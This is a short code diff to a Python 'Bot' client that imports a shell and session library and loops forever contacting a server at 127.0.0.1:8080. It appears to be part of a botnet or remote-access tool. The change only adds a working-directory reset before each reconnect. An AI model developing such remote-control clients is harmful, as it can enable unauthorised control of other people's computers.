@@ -7,8 +7,8 @@ import json
 import socket
 import pickle
 from time import sleep 
-from os import getcwd, path
 from lib import shell, session
+from os import getcwd, path, chdir
 
 # wait before calling server
 # sleep(30)
@@ -92,6 +92,7 @@ class Bot(object):
 if  __name__ == '__main__':
  home = getcwd()
  while True:
+  chdir(home)
   bot = Bot(home)
   bot.contact_server('127.0.0.1', 8080)
   bot.shutdown()
